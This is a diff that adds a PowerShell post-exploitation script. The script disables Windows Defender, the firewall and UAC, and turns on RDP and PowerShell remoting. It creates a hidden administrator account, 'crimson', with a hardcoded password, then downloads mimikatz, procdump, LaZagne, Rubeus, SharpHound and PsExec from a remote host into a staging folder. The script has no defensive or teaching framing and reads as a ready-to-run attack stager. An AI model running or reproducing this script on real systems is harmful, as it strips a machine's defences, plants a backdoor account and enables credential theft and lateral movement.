@@ -1,0 +1,28 @@
+mkdir C:/blood
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath C:/blood
+NetSh Advfirewall set allprofiles state off
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+Enable-PSRemoting
+net user crimson ASDqwe123 /add
+net localgroup "Administrators" crimson /add
+net localgroup "Remote Desktop Users" crimson /add
+
+if([Environment]::Is64BitProcess -eq $True){
+    iwr $url_1029384756/tools/mimikatz64.zip  -OutFile C:/blood/mimikatz.zip
+    iwr $url_1029384756/tools/PsExec64.exe  -OutFile C:/blood/psexec.exe
+    iwr $url_1029384756/tools/procdump64.exe  -OutFile C:/blood/procdump.exe
+}else{
+    iwr $url_1029384756/tools/mimikatz32.zip  -OutFile C:/blood/mimikatz.zip
+    iwr $url_1029384756/tools/PsExec.exe  -OutFile C:/blood/psexec.exe
+    iwr $url_1029384756/tools/procdump.exe  -OutFile C:/blood/procdump.exe
+}
+iwr $url_1029384756/tools/nmap780_setup.exe  -OutFile C:/blood/nmap780_setup.exe
+iwr $url_1029384756/tools/SharpHound.exe  -OutFile C:/blood/SharpHound.exe
+iwr $url_1029384756/tools/lazagne.exe -OutFile C:/blood/lazagne.exe
+iwr $url_1029384756/tools/Rubeus.exe -OutFile C:/blood/Rubeus.exe
+
+Expand-Archive -LiteralPath 'C:/blood/mimikatz.zip' -DestinationPath 'C:/blood/'
